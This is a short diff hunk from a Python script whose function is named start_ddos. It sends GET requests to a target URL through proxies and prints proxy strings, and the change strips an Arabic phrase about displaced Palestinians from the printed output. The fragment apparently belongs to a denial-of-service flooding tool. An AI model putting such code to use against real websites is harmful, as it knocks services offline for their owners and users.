@@ -62,7 +62,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-			print(color+"{}حقوق الفلسطينيين المهجرين".format(prox))
+			print(color+"{}".format(prox))
 	except:
 		pass
 
